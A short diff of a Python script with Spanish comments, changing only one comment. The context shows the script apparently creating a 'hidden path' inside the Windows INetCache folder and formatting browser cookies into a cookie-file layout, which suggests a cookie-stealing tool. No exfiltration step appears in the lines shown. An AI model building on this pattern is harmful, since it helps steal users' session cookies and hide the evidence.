@@ -24,7 +24,7 @@ instalar_dependencias()
 ruta_oculta = os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Windows', 'INetCache')
 os.makedirs(ruta_oculta, exist_ok=True)
 
-# Función para formatear cookies (igual que antes)
+# Función para formatear cookies
 def formatear_cookie(cookie: Cookie) -> str:
     host = cookie.domain
     flag = "TRUE" if cookie.domain.startswith('.') else "FALSE"
